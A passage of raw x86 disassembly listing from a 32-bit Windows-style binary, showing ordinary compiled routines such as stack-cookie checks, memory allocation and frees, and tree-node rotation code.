   19e72:	push   edi
   19e73:	mov    edi,DWORD PTR [ebp+0xc]
   19e76:	push   esi
   19e77:	push   edi
   19e78:	push   DWORD PTR [ebp+0x8]
   19e7b:	mov    ebx,ecx
   19e7d:	call   0x19d8e
   19e82:	lea    eax,[esi+0x1]
   19e85:	movzx  edx,BYTE PTR [eax]
   19e88:	push   eax
   19e89:	inc    edi
   19e8a:	lea    edx,[edx*8+0x7a400]
   19e91:	push   edi
   19e92:	push   edx
   19e93:	mov    ecx,ebx
   19e95:	call   DWORD PTR [edx+0x4]
   19e98:	pop    edi
   19e99:	pop    esi
   19e9a:	pop    ebx
   19e9b:	pop    ebp
   19e9c:	ret    0xc
   19e9f:	int3   
   19ea0:	int3   
   19ea1:	int3   
   19ea2:	int3   
   19ea3:	int3   
   19ea4:	mov    edi,edi
   19ea6:	push   ebp
   19ea7:	mov    ebp,esp
   19ea9:	push   ebx
   19eaa:	push   esi
   19eab:	mov    esi,DWORD PTR [ebp+0x10]
   19eae:	push   edi
   19eaf:	mov    edi,DWORD PTR [ebp+0xc]
   19eb2:	push   esi
   19eb3:	push   edi
   19eb4:	push   DWORD PTR [ebp+0x8]
   19eb7:	mov    ebx,ecx
   19eb9:	call   0x19d8e
   19ebe:	lea    eax,[esi+0x1]
   19ec1:	movzx  edx,BYTE PTR [eax]
   19ec4:	push   eax
   19ec5:	inc    edi
   19ec6:	lea    edx,[edx*8+0x7ac08]
   19ecd:	push   edi
   19ece:	push   edx
   19ecf:	mov    ecx,ebx
   19ed1:	call   DWORD PTR [edx+0x4]
   19ed4:	pop    edi
   19ed5:	pop    esi
   19ed6:	pop    ebx
   19ed7:	pop    ebp
   19ed8:	ret    0xc
   19edb:	int3   
   19edc:	int3   
   19edd:	int3   
   19ede:	int3   
   19edf:	int3   
   19ee0:	mov    edi,edi
   19ee2:	push   ebp
   19ee3:	mov    ebp,esp
   19ee5:	mov    DWORD PTR [ecx],0x1
   19eeb:	pop    ebp
   19eec:	jmp    0x19e68
   19ef1:	int3   
   19ef2:	int3   
   19ef3:	int3   
   19ef4:	int3   
   19ef5:	int3   
   19ef6:	mov    edi,edi
   19ef8:	push   ebp
   19ef9:	mov    ebp,esp
   19efb:	mov    DWORD PTR [ecx+0x4],0x1
   19f02:	pop    ebp
   19f03:	jmp    0x19e68
   19f08:	int3   
   19f09:	int3   
   19f0a:	int3   
   19f0b:	int3   
   19f0c:	int3   
   19f0d:	int3   
   19f0e:	mov    edi,edi
   19f10:	push   ebp
   19f11:	mov    ebp,esp
   19f13:	mov    eax,DWORD PTR [ebp+0x10]
   19f16:	sub    esp,0x10
   19f19:	test   BYTE PTR [eax+0x1],0x38
   19f1d:	push   eax
   19f1e:	push   DWORD PTR [ebp+0xc]
   19f21:	jne    0x19f36
   19f23:	mov    DWORD PTR [ebp-0x8],0x5bf6
   19f2a:	mov    DWORD PTR [ebp-0x4],0x19d8e
   19f31:	lea    eax,[ebp-0x8]
   19f34:	jmp    0x19f47
   19f36:	mov    DWORD PTR [ebp-0x10],0x52f6
   19f3d:	mov    DWORD PTR [ebp-0xc],0x19d8e
   19f44:	lea    eax,[ebp-0x10]
   19f47:	push   eax
   19f48:	call   0x19d8e
   19f4d:	leave  
   19f4e:	ret    0xc
   19f51:	int3   
   19f52:	int3   
   19f53:	int3   
   19f54:	int3   
   19f55:	int3   
   19f56:	mov    edi,edi
   19f58:	push   ebp
   19f59:	mov    ebp,esp
   19f5b:	mov    eax,DWORD PTR [ebp+0x10]
   19f5e:	sub    esp,0x10
   19f61:	test   BYTE PTR [eax+0x1],0x38
   19f65:	push   eax
   19f66:	push   DWORD PTR [ebp+0xc]
   19f69:	jne    0x19f7e
   19f6b:	mov    DWORD PTR [ebp-0x8],0x66f7
   19f72:	mov    DWORD PTR [ebp-0x4],0x19d8e
   19f79:	lea    eax,[ebp-0x8]
   19f7c:	jmp    0x19f8f
   19f7e:	mov    DWORD PTR [ebp-0x10],0x52f7
   19f85:	mov    DWORD PTR [ebp-0xc],0x19d8e
   19f8c:	lea    eax,[ebp-0x10]
   19f8f:	push   eax
   19f90:	call   0x19d8e
   19f95:	leave  
   19f96:	ret    0xc
   19f99:	int3   
   19f9a:	int3   
   19f9b:	int3   
   19f9c:	int3   
   19f9d:	int3   
   19f9e:	mov    edi,edi
   19fa0:	push   ebp
   19fa1:	mov    ebp,esp
   19fa3:	push   ecx
   19fa4:	push   ecx
   19fa5:	mov    edx,DWORD PTR [ebp+0x10]
   19fa8:	mov    al,BYTE PTR [edx+0x1]
   19fab:	cmp    al,0x15
   19fad:	je     0x19fcd
   19faf:	cmp    al,0x25
   19fb1:	je     0x19fcd
   19fb3:	and    al,0x38
   19fb5:	cmp    al,0x10
   19fb7:	je     0x19fc5
   19fb9:	cmp    al,0x18
   19fbb:	je     0x19fc5
   19fbd:	cmp    al,0x20
   19fbf:	je     0x19fc5
   19fc1:	cmp    al,0x28
   19fc3:	jne    0x19fd9
   19fc5:	mov    eax,DWORD PTR [ecx+0x8]
   19fc8:	or     DWORD PTR [eax],0xffffffff
   19fcb:	jmp    0x19fd9
   19fcd:	mov    eax,DWORD PTR [edx+0x2]
   19fd0:	mov    eax,DWORD PTR [eax]
   19fd2:	push   esi
   19fd3:	mov    esi,DWORD PTR [ecx+0x8]
   19fd6:	mov    DWORD PTR [esi],eax
   19fd8:	pop    esi
   19fd9:	push   edx
   19fda:	push   DWORD PTR [ebp+0xc]
   19fdd:	lea    eax,[ebp-0x8]
   19fe0:	push   eax
   19fe1:	mov    DWORD PTR [ebp-0x8],0x52ff
   19fe8:	mov    DWORD PTR [ebp-0x4],0x19d8e
   19fef:	call   0x19d8e
   19ff4:	leave  
   19ff5:	ret    0xc
   19ff8:	int3   
   19ff9:	int3   
   19ffa:	int3   
   19ffb:	int3   
   19ffc:	int3   
   19ffd:	int3   
   19ffe:	mov    edi,edi
   1a000:	push   ebp
   1a001:	mov    ebp,esp
   1a003:	sub    esp,0x5c
   1a006:	mov    eax,ds:0x7eb38
   1a00b:	xor    eax,ebp
   1a00d:	mov    DWORD PTR [ebp-0x4],eax
   1a010:	mov    eax,DWORD PTR [ebp+0x10]
   1a013:	push   esi
   1a014:	mov    esi,DWORD PTR [ebp+0x8]
   1a017:	push   edi
   1a018:	mov    edi,DWORD PTR [ebp+0xc]
   1a01b:	push   0x0
   1a01d:	push   eax
   1a01e:	lea    ecx,[ebp-0x5c]
   1a021:	call   0x19d54
   1a026:	push   edi
   1a027:	push   esi
   1a028:	lea    ecx,[ebp-0x5c]
   1a02b:	call   0x19c96
   1a030:	mov    ecx,DWORD PTR [ebp-0x4]
   1a033:	pop    edi
   1a034:	xor    ecx,ebp
   1a036:	pop    esi
   1a037:	call   0x1da79
   1a03c:	leave  
   1a03d:	ret    0xc
   1a040:	int3   
   1a041:	int3   
   1a042:	int3   
   1a043:	int3   
   1a044:	int3   
   1a045:	int3   
   1a046:	mov    edi,edi
   1a048:	push   ebp
   1a049:	mov    ebp,esp
   1a04b:	push   esi
   1a04c:	mov    esi,DWORD PTR [ebp+0x8]
   1a04f:	push   edi
   1a050:	mov    edi,ecx
   1a052:	cmp    edi,esi
   1a054:	je     0x1a081
   1a056:	mov    eax,DWORD PTR [edi+0x4]
   1a059:	cmp    eax,DWORD PTR [esi+0x4]
   1a05c:	je     0x1a070
   1a05e:	cmp    BYTE PTR [edi],0x0
   1a061:	je     0x1a06a
   1a063:	push   eax
   1a064:	call   0x10a9a
   1a069:	pop    ecx
   1a06a:	mov    al,BYTE PTR [esi]
   1a06c:	mov    BYTE PTR [edi],al
   1a06e:	jmp    0x1a078
   1a070:	cmp    BYTE PTR [esi],0x0
   1a073:	je     0x1a078
   1a075:	mov    BYTE PTR [edi],0x1
   1a078:	mov    eax,DWORD PTR [esi+0x4]
   1a07b:	mov    BYTE PTR [esi],0x0
   1a07e:	mov    DWORD PTR [edi+0x4],eax
   1a081:	mov    eax,edi
   1a083:	pop    edi
   1a084:	pop    esi
   1a085:	pop    ebp
   1a086:	ret    0x4
   1a089:	int3   
   1a08a:	int3   
   1a08b:	int3   
   1a08c:	int3   
   1a08d:	int3   
   1a08e:	mov    edi,edi
   1a090:	push   ebp
   1a091:	mov    ebp,esp
   1a093:	sub    esp,0x50
   1a096:	push   ebx
   1a097:	push   esi
   1a098:	push   edi
   1a099:	mov    edi,0x4000
   1a09e:	push   edi
   1a09f:	call   0x10a66
   1a0a4:	pop    ecx
   1a0a5:	xor    ebx,ebx
   1a0a7:	push   0x38
   1a0a9:	push   0x1ec8a
   1a0ae:	cmp    eax,ebx
   1a0b0:	mov    DWORD PTR [ebp-0x4],eax
   1a0b3:	mov    DWORD PTR [ebp-0xc],eax
   1a0b6:	push   0x2f
   1a0b8:	lea    eax,[ebp-0x50]
   1a0bb:	setne  BYTE PTR [ebp-0x10]
   1a0bf:	push   eax
   1a0c0:	xor    esi,esi
   1a0c2:	mov    DWORD PTR [ebp-0x30],ebx
   1a0c5:	mov    DWORD PTR [ebp-0x2c],ebx
   1a0c8:	mov    DWORD PTR [ebp-0x28],ebx
   1a0cb:	mov    DWORD PTR [ebp-0x4c],ebx
   1a0ce:	mov    DWORD PTR [ebp-0x50],ebx
   1a0d1:	call   0x1b966
   1a0d6:	test   eax,eax
   1a0d8:	je     0x1a0f7
   1a0da:	mov    esi,DWORD PTR [ebp+0x8]
   1a0dd:	mov    BYTE PTR [esi],bl
   1a0df:	mov    DWORD PTR [esi+0x4],ebx
   1a0e2:	cmp    BYTE PTR [ebp-0x10],bl
   1a0e5:	je     0x1a0f0
   1a0e7:	push   DWORD PTR [ebp-0x4]
   1a0ea:	call   0x10a9a
   1a0ef:	pop    ecx
   1a0f0:	mov    eax,esi
   1a0f2:	jmp    0x1a20c
   1a0f7:	mov    eax,DWORD PTR [ebp+0x10]
   1a0fa:	mov    DWORD PTR [ebp-0x4c],eax
   1a0fd:	mov    eax,DWORD PTR [ebp+0xc]
   1a100:	mov    DWORD PTR [ebp-0x50],eax
   1a103:	mov    eax,DWORD PTR [ebp-0xc]
   1a106:	add    eax,esi
   1a108:	mov    DWORD PTR [ebp-0x44],eax
   1a10b:	push   0x4
   1a10d:	lea    eax,[ebp-0x50]
   1a110:	push   eax
   1a111:	mov    DWORD PTR [ebp-0x40],edi
   1a114:	call   0x1bafa
   1a119:	cmp    eax,0xfffffffc
   1a11c:	mov    DWORD PTR [ebp+0x10],eax
   1a11f:	jl     0x1a133
   1a121:	cmp    eax,0xfffffffd
   1a124:	jle    0x1a1bc
   1a12a:	cmp    eax,0x2
   1a12d:	je     0x1a1bc
   1a133:	mov    eax,edi
   1a135:	sub    eax,DWORD PTR [ebp-0x40]
   1a138:	add    esi,eax
   1a13a:	cmp    DWORD PTR [ebp-0x40],ebx
   1a13d:	jne    0x1a1a6
   1a13f:	mov    al,BYTE PTR [ebp-0x10]
   1a142:	mov    BYTE PTR [ebp-0x18],al
   1a145:	mov    eax,DWORD PTR [ebp-0xc]
   1a148:	mov    DWORD PTR [ebp-0x14],eax
   1a14b:	lea    eax,[esi+0x4000]
   1a151:	push   eax
   1a152:	mov    BYTE PTR [ebp-0x10],bl
   1a155:	call   0x10a66
   1a15a:	pop    ecx
   1a15b:	cmp    eax,ebx
   1a15d:	setne  cl
   1a160:	mov    DWORD PTR [ebp-0x4],eax
   1a163:	lea    eax,[ebp-0x8]
   1a166:	mov    BYTE PTR [ebp-0x8],cl
   1a169:	push   eax
   1a16a:	lea    ecx,[ebp-0x10]
   1a16d:	call   0x1a046
   1a172:	cmp    BYTE PTR [ebp-0x8],bl
   1a175:	je     0x1a180
   1a177:	push   DWORD PTR [ebp-0x4]
   1a17a:	call   0x10a9a
   1a17f:	pop    ecx
   1a180:	push   esi
   1a181:	push   DWORD PTR [ebp-0x14]
   1a184:	push   DWORD PTR [ebp-0xc]
   1a187:	call   0x1dade
   1a18c:	add    esp,0xc
   1a18f:	cmp    BYTE PTR [ebp-0x18],bl
   1a192:	je     0x1a19d
   1a194:	push   DWORD PTR [ebp-0x14]
   1a197:	call   0x10a9a
   1a19c:	pop    ecx
   1a19d:	cmp    DWORD PTR [ebp-0x40],ebx
   1a1a0:	je     0x1a103
   1a1a6:	lea    eax,[ebp-0x50]
   1a1a9:	push   eax
   1a1aa:	call   0x1cd20
   1a1af:	cmp    DWORD PTR [ebp+0x10],0x1
   1a1b3:	jne    0x1a1de
   1a1b5:	mov    eax,DWORD PTR [ebp+0x14]
   1a1b8:	mov    DWORD PTR [eax],esi
   1a1ba:	jmp    0x1a1fe
   1a1bc:	lea    eax,[ebp-0x50]
   1a1bf:	push   eax
   1a1c0:	call   0x1cd20
   1a1c5:	mov    esi,DWORD PTR [ebp+0x8]
   1a1c8:	mov    BYTE PTR [esi],bl
   1a1ca:	mov    DWORD PTR [esi+0x4],ebx
   1a1cd:	cmp    BYTE PTR [ebp-0x10],bl
   1a1d0:	je     0x1a0f0
   1a1d6:	push   DWORD PTR [ebp-0xc]
   1a1d9:	jmp    0x1a0ea
   1a1de:	lea    eax,[ebp-0x18]
   1a1e1:	push   eax
   1a1e2:	lea    ecx,[ebp-0x10]
   1a1e5:	mov    BYTE PTR [ebp-0x18],bl
   1a1e8:	mov    DWORD PTR [ebp-0x14],ebx
   1a1eb:	call   0x1a046
   1a1f0:	cmp    BYTE PTR [ebp-0x18],bl
   1a1f3:	je     0x1a1fe
   1a1f5:	push   DWORD PTR [ebp-0x14]
   1a1f8:	call   0x10a9a
   1a1fd:	pop    ecx
   1a1fe:	mov    eax,DWORD PTR [ebp+0x8]
   1a201:	mov    cl,BYTE PTR [ebp-0x10]
   1a204:	mov    BYTE PTR [eax],cl
   1a206:	mov    ecx,DWORD PTR [ebp-0xc]
   1a209:	mov    DWORD PTR [eax+0x4],ecx
   1a20c:	pop    edi
   1a20d:	pop    esi
   1a20e:	pop    ebx
   1a20f:	leave  
   1a210:	ret    0x10
   1a213:	int3   
   1a214:	int3   
   1a215:	int3   
   1a216:	int3   
   1a217:	int3   
   1a218:	push   0x0
   1a21a:	push   0x7f840
   1a21f:	call   DWORD PTR ds:0x1f024
   1a225:	ret    
   1a226:	int3   
   1a227:	int3   
   1a228:	int3   
   1a229:	int3   
   1a22a:	int3   
   1a22b:	int3   
   1a22c:	push   0x0
   1a22e:	push   0x7f840
   1a233:	call   0x11c32
   1a238:	call   eax
   1a23a:	and    DWORD PTR ds:0x7f860,0x0
   1a241:	and    DWORD PTR ds:0x7f864,0x0
   1a248:	ret    
   1a249:	int3   
   1a24a:	int3   
   1a24b:	int3   
   1a24c:	int3   
   1a24d:	int3   
   1a24e:	mov    edi,edi
   1a250:	push   esi
   1a251:	push   edi
   1a252:	push   0x1
   1a254:	xor    edi,edi
   1a256:	push   edi
   1a257:	mov    esi,ecx
   1a259:	call   0x139ec
   1a25e:	cmp    DWORD PTR ds:0x7f6e4,edi
   1a264:	jne    0x1a27b
   1a266:	mov    ecx,eax
   1a268:	mov    DWORD PTR ds:0x7f6e4,ecx
   1a26e:	mov    DWORD PTR [ecx],edi
   1a270:	mov    ecx,DWORD PTR ds:0x7f6e4
   1a276:	xor    eax,eax
   1a278:	mov    DWORD PTR [ecx+0x8],edi
   1a27b:	inc    DWORD PTR ds:0x7f868
   1a281:	cmp    eax,edi
   1a283:	je     0x1a28c
   1a285:	push   eax
   1a286:	call   0x10a9a
   1a28b:	pop    ecx
   1a28c:	push   edi
   1a28d:	push   DWORD PTR ds:0x7f6e4
   1a293:	mov    ecx,esi
   1a295:	call   0x139ec
   1a29a:	mov    DWORD PTR [esi+0xc],edi
   1a29d:	mov    DWORD PTR [esi+0x4],eax
   1a2a0:	mov    DWORD PTR [eax],eax
   1a2a2:	mov    esi,DWORD PTR [esi+0x4]
   1a2a5:	pop    edi
   1a2a6:	mov    DWORD PTR [esi+0x8],esi
   1a2a9:	pop    esi
   1a2aa:	ret    
   1a2ab:	int3   
   1a2ac:	int3   
   1a2ad:	int3   
   1a2ae:	int3   
   1a2af:	int3   
   1a2b0:	mov    edi,edi
   1a2b2:	push   ebx
   1a2b3:	xor    ebx,ebx
   1a2b5:	push   ebx
   1a2b6:	push   ebx
   1a2b7:	push   ebx
   1a2b8:	push   ebx
   1a2b9:	push   0x7f840
   1a2be:	call   DWORD PTR ds:0x1f028
   1a2c4:	test   eax,eax
   1a2c6:	jge    0x1a2cc
   1a2c8:	xor    al,al
   1a2ca:	pop    ebx
   1a2cb:	ret    
   1a2cc:	push   esi
   1a2cd:	cmp    DWORD PTR ds:0x7f860,ebx
   1a2d3:	jne    0x1a2fb
   1a2d5:	push   0x10
   1a2d7:	call   0x10a66
   1a2dc:	mov    esi,eax
   1a2de:	pop    ecx
   1a2df:	cmp    esi,ebx
   1a2e1:	je     0x1a2f5
   1a2e3:	mov    ecx,esi
   1a2e5:	mov    BYTE PTR [esi+0x8],bl
   1a2e8:	call   0x1a24e
   1a2ed:	mov    DWORD PTR ds:0x7f860,esi
   1a2f3:	jmp    0x1a2fb
   1a2f5:	mov    DWORD PTR ds:0x7f860,ebx
   1a2fb:	cmp    DWORD PTR ds:0x7f864,ebx
   1a301:	jne    0x1a329
   1a303:	push   0x10
   1a305:	call   0x10a66
   1a30a:	mov    esi,eax
   1a30c:	pop    ecx
   1a30d:	cmp    esi,ebx
   1a30f:	je     0x1a323
   1a311:	mov    ecx,esi
   1a313:	mov    BYTE PTR [esi+0x8],bl
   1a316:	call   0x14128
   1a31b:	mov    DWORD PTR ds:0x7f864,esi
   1a321:	jmp    0x1a329
   1a323:	mov    DWORD PTR ds:0x7f864,ebx
   1a329:	pop    esi
   1a32a:	mov    al,0x1
   1a32c:	pop    ebx
   1a32d:	ret    
   1a32e:	int3   
   1a32f:	int3   
   1a330:	int3   
   1a331:	int3   
   1a332:	int3   
   1a333:	int3   
   1a334:	mov    eax,ecx
   1a336:	add    DWORD PTR [eax+0x8],0x4
   1a33a:	mov    ecx,DWORD PTR [eax+0x8]
   1a33d:	cmp    ecx,DWORD PTR [eax+0x4]
   1a340:	jne    0x1a35b
   1a342:	add    DWORD PTR [eax+0xc],0x4
   1a346:	mov    ecx,DWORD PTR [eax+0xc]
   1a349:	mov    ecx,DWORD PTR [ecx]
   1a34b:	mov    DWORD PTR [eax],ecx
   1a34d:	add    ecx,0x1000
   1a353:	mov    DWORD PTR [eax+0x4],ecx
   1a356:	mov    ecx,DWORD PTR [eax]
   1a358:	mov    DWORD PTR [eax+0x8],ecx
   1a35b:	ret    
   1a35c:	int3   
   1a35d:	int3   
   1a35e:	int3   
   1a35f:	int3   
   1a360:	int3   
   1a361:	int3   
   1a362:	mov    edi,edi
   1a364:	push   ebp
   1a365:	mov    ebp,esp
   1a367:	mov    eax,ecx
   1a369:	mov    ecx,DWORD PTR [ebp+0xc]
   1a36c:	mov    edx,DWORD PTR [ecx]
   1a36e:	mov    DWORD PTR [eax],edx
   1a370:	mov    edx,DWORD PTR [ecx]
   1a372:	add    edx,0x1000
   1a378:	mov    DWORD PTR [eax+0x4],edx
   1a37b:	mov    edx,DWORD PTR [ebp+0x8]
   1a37e:	mov    DWORD PTR [eax+0x8],edx
   1a381:	mov    DWORD PTR [eax+0xc],ecx
   1a384:	pop    ebp
   1a385:	ret    0x8
   1a388:	int3   
   1a389:	int3   
   1a38a:	int3   
   1a38b:	int3   
   1a38c:	int3   
   1a38d:	int3   
   1a38e:	mov    edi,edi
   1a390:	push   ebp
   1a391:	mov    ebp,esp
   1a393:	mov    eax,DWORD PTR [ebp+0x8]
   1a396:	mov    edx,DWORD PTR ds:0x7f89c
   1a39c:	jmp    0x1a3a0
   1a39e:	mov    eax,ecx
   1a3a0:	mov    ecx,DWORD PTR [eax+0x8]
   1a3a3:	cmp    ecx,edx
   1a3a5:	jne    0x1a39e
   1a3a7:	pop    ebp
   1a3a8:	ret    0x4
   1a3ab:	int3   
   1a3ac:	int3   
   1a3ad:	int3   
   1a3ae:	int3   
   1a3af:	int3   
   1a3b0:	mov    edi,edi
   1a3b2:	push   ebp
   1a3b3:	mov    ebp,esp
   1a3b5:	mov    eax,DWORD PTR [ebp+0x8]
   1a3b8:	mov    edx,DWORD PTR ds:0x7f89c
   1a3be:	jmp    0x1a3c2
   1a3c0:	mov    eax,ecx
   1a3c2:	mov    ecx,DWORD PTR [eax]
   1a3c4:	cmp    ecx,edx
   1a3c6:	jne    0x1a3c0
   1a3c8:	pop    ebp
   1a3c9:	ret    0x4
   1a3cc:	int3   
   1a3cd:	int3   
   1a3ce:	int3   
   1a3cf:	int3   
   1a3d0:	int3   
   1a3d1:	int3   
   1a3d2:	mov    edi,edi
   1a3d4:	push   esi
   1a3d5:	mov    esi,ecx
   1a3d7:	mov    ecx,DWORD PTR [esi]
   1a3d9:	mov    eax,DWORD PTR [ecx+0x8]
   1a3dc:	cmp    eax,DWORD PTR ds:0x7f89c
   1a3e2:	je     0x1a3f0
   1a3e4:	push   eax
   1a3e5:	call   0x1a3b0
   1a3ea:	jmp    0x1a3ff
   1a3ec:	mov    DWORD PTR [esi],eax
   1a3ee:	mov    ecx,eax
   1a3f0:	mov    eax,DWORD PTR [ecx+0x4]
   1a3f3:	cmp    ecx,DWORD PTR [eax+0x8]
   1a3f6:	je     0x1a3ec
   1a3f8:	mov    ecx,DWORD PTR [esi]
   1a3fa:	cmp    DWORD PTR [ecx+0x8],eax
   1a3fd:	je     0x1a401
   1a3ff:	mov    DWORD PTR [esi],eax
   1a401:	pop    esi
   1a402:	ret    
   1a403:	int3   
   1a404:	int3   
   1a405:	int3   
   1a406:	int3   
   1a407:	int3   
   1a408:	mov    edi,edi
   1a40a:	push   ebp
   1a40b:	mov    ebp,esp
   1a40d:	mov    eax,DWORD PTR [ebp+0x8]
   1a410:	jmp    0x1a420
   1a412:	mov    ecx,DWORD PTR [eax]
   1a414:	mov    edx,DWORD PTR [ebp+0x10]
   1a417:	add    DWORD PTR [ebp+0x10],0x4
   1a41b:	mov    DWORD PTR [edx],ecx
   1a41d:	add    eax,0x4
   1a420:	cmp    eax,DWORD PTR [ebp+0xc]
   1a423:	jne    0x1a412
   1a425:	mov    eax,DWORD PTR [ebp+0x10]
   1a428:	pop    ebp
   1a429:	ret    0xc
   1a42c:	int3   
   1a42d:	int3   
   1a42e:	int3   
   1a42f:	int3   
   1a430:	int3   
   1a431:	int3   
   1a432:	mov    edi,edi
   1a434:	push   ebp
   1a435:	mov    ebp,esp
   1a437:	mov    eax,DWORD PTR [ebp+0x8]
   1a43a:	test   eax,eax
   1a43c:	jge    0x1a440
   1a43e:	xor    eax,eax
   1a440:	shl    eax,0x2
   1a443:	push   eax
   1a444:	call   0x10a66
   1a449:	pop    ecx
   1a44a:	pop    ebp
   1a44b:	ret    0x8
   1a44e:	int3   
   1a44f:	int3   
   1a450:	int3   
   1a451:	int3   
   1a452:	int3   
   1a453:	int3   
   1a454:	mov    edi,edi
   1a456:	push   ebp
   1a457:	mov    ebp,esp
   1a459:	push   esi
   1a45a:	mov    esi,ecx
   1a45c:	push   DWORD PTR [esi]
   1a45e:	call   0x10a9a
   1a463:	test   BYTE PTR [ebp+0x8],0x1
   1a467:	pop    ecx
   1a468:	je     0x1a471
   1a46a:	push   esi
   1a46b:	call   0x10a9a
   1a470:	pop    ecx
   1a471:	mov    eax,esi
   1a473:	pop    esi
   1a474:	pop    ebp
   1a475:	ret    0x4
   1a478:	int3   
   1a479:	int3   
   1a47a:	int3   
   1a47b:	int3   
   1a47c:	int3   
   1a47d:	int3   
   1a47e:	mov    edi,edi
   1a480:	push   ebp
   1a481:	mov    ebp,esp
   1a483:	mov    eax,ds:0x7f894
   1a488:	sub    esp,0x20
   1a48b:	push   ebx
   1a48c:	push   esi
   1a48d:	push   edi
   1a48e:	lea    esi,[eax+0x4]
   1a491:	lea    edi,[ebp-0x10]
   1a494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a498:	lea    ebx,[eax+0x14]
   1a49b:	jmp    0x1a4b9
   1a49d:	mov    eax,DWORD PTR [eax]
   1a49f:	mov    ecx,DWORD PTR [eax+0x8]
   1a4a2:	cmp    ecx,DWORD PTR [ebp+0x8]
   1a4a5:	jne    0x1a4b1
   1a4a7:	cmp    BYTE PTR [eax+0x24],0x0
   1a4ab:	jne    0x1a4ca
   1a4ad:	mov    BYTE PTR [eax+0x24],0x1
   1a4b1:	lea    ecx,[ebp-0x10]
   1a4b4:	call   0x1a334
   1a4b9:	mov    eax,DWORD PTR [ebp-0x8]
   1a4bc:	lea    edi,[ebp-0x20]
   1a4bf:	mov    esi,ebx
   1a4c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4c5:	cmp    eax,DWORD PTR [ebp-0x18]
   1a4c8:	jne    0x1a49d
   1a4ca:	pop    edi
   1a4cb:	pop    esi
   1a4cc:	pop    ebx
   1a4cd:	leave  
   1a4ce:	ret    0x4
   1a4d1:	int3   
   1a4d2:	int3   
   1a4d3:	int3   
   1a4d4:	int3   
   1a4d5:	int3   
   1a4d6:	mov    eax,ecx
   1a4d8:	xor    ecx,ecx
   1a4da:	mov    DWORD PTR [eax+0x4],ecx
   1a4dd:	mov    DWORD PTR [eax+0x8],ecx
   1a4e0:	mov    DWORD PTR [eax+0xc],ecx
   1a4e3:	mov    DWORD PTR [eax+0x10],ecx
   1a4e6:	mov    DWORD PTR [eax+0x14],ecx
   1a4e9:	mov    DWORD PTR [eax+0x18],ecx
   1a4ec:	mov    DWORD PTR [eax+0x1c],ecx
   1a4ef:	mov    DWORD PTR [eax+0x20],ecx
   1a4f2:	mov    DWORD PTR [eax+0x24],ecx
   1a4f5:	mov    DWORD PTR [eax+0x28],ecx
   1a4f8:	mov    DWORD PTR [eax+0x2c],ecx
   1a4fb:	ret    0x4
   1a4fe:	int3   
   1a4ff:	int3   
   1a500:	int3   
   1a501:	int3   
   1a502:	int3   
   1a503:	int3   
   1a504:	mov    edi,edi
   1a506:	push   ebp
   1a507:	mov    ebp,esp
   1a509:	sub    esp,0x10
   1a50c:	push   esi
   1a50d:	push   edi
   1a50e:	lea    esi,[ecx+0x4]
   1a511:	lea    edi,[ebp-0x10]
   1a514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a518:	mov    eax,DWORD PTR [ebp-0x8]
   1a51b:	pop    edi
   1a51c:	pop    esi
   1a51d:	leave  
   1a51e:	ret    
   1a51f:	int3   
   1a520:	int3   
   1a521:	int3   
   1a522:	int3   
   1a523:	int3   
   1a524:	mov    edi,edi
   1a526:	push   ebp
   1a527:	mov    ebp,esp
   1a529:	mov    edx,DWORD PTR [ebp+0x8]
   1a52c:	mov    eax,DWORD PTR [edx+0x8]
   1a52f:	push   esi
   1a530:	mov    esi,DWORD PTR [eax]
   1a532:	mov    DWORD PTR [edx+0x8],esi
   1a535:	mov    esi,DWORD PTR [eax]
   1a537:	cmp    esi,DWORD PTR ds:0x7f89c
   1a53d:	je     0x1a542
   1a53f:	mov    DWORD PTR [esi+0x4],edx
   1a542:	mov    esi,DWORD PTR [edx+0x4]
   1a545:	mov    DWORD PTR [eax+0x4],esi
   1a548:	mov    ecx,DWORD PTR [ecx+0x4]
   1a54b:	pop    esi
   1a54c:	cmp    edx,DWORD PTR [ecx+0x4]
   1a54f:	jne    0x1a556
   1a551:	mov    DWORD PTR [ecx+0x4],eax
   1a554:	jmp    0x1a564
   1a556:	mov    ecx,DWORD PTR [edx+0x4]
   1a559:	cmp    edx,DWORD PTR [ecx]
   1a55b:	jne    0x1a561
   1a55d:	mov    DWORD PTR [ecx],eax
   1a55f:	jmp    0x1a564
   1a561:	mov    DWORD PTR [ecx+0x8],eax
   1a564:	mov    DWORD PTR [eax],edx
   1a566:	mov    DWORD PTR [edx+0x4],eax
   1a569:	pop    ebp
   1a56a:	ret    0x4
   1a56d:	int3   
   1a56e:	int3   
   1a56f:	int3   
   1a570:	int3   
   1a571:	int3   
   1a572:	mov    edi,edi
   1a574:	push   ebp
   1a575:	mov    ebp,esp
   1a577:	mov    edx,DWORD PTR [ebp+0x8]
   1a57a:	mov    eax,DWORD PTR [edx]
   1a57c:	push   esi
   1a57d:	mov    esi,DWORD PTR [eax+0x8]
   1a580:	mov    DWORD PTR [edx],esi
   1a582:	mov    esi,DWORD PTR [eax+0x8]
   1a585:	cmp    esi,DWORD PTR ds:0x7f89c
   1a58b:	je     0x1a590
   1a58d:	mov    DWORD PTR [esi+0x4],edx
   1a590:	mov    esi,DWORD PTR [edx+0x4]
   1a593:	mov    DWORD PTR [eax+0x4],esi
   1a596:	mov    ecx,DWORD PTR [ecx+0x4]
   1a599:	pop    esi
   1a59a:	cmp    edx,DWORD PTR [ecx+0x4]
   1a59d:	jne    0x1a5a4
   1a59f:	mov    DWORD PTR [ecx+0x4],eax
   1a5a2:	jmp    0x1a5b3
   1a5a4:	mov    ecx,DWORD PTR [edx+0x4]
   1a5a7:	cmp    edx,DWORD PTR [ecx+0x8]
   1a5aa:	jne    0x1a5b1
   1a5ac:	mov    DWORD PTR [ecx+0x8],eax
   1a5af:	jmp    0x1a5b3
